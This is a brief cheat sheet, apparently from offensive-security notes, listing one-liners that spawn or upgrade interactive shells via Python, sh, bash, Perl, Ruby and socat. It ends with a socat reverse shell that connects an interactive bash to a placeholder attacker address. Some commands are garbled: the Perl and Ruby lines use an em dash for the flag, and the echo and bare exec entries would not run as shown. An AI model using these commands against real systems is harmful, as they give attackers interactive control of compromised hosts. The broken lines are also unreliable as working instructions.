# Python :

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

# Echo :

```bash
$ echo os.system('/bin/bash')
```

# sh :

```bash
$ /bin/sh -i
```

# Bash :

```bash
$ /bin/bash -i
```

# Perl :

```bash
$ perl —e 'exec "/bin/sh";'
```

```bash
$ exec "/bin/sh";
```

# Ruby :

```bash
$ ruby —e 'exec "/bin/sh";'
```

```bash
$ exec "/bin/sh";
```

# Socat :

```bash
$ socat -,raw,echo=0 tcp-listen:4444
```

```bash
$ socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<ip>:<port>
```
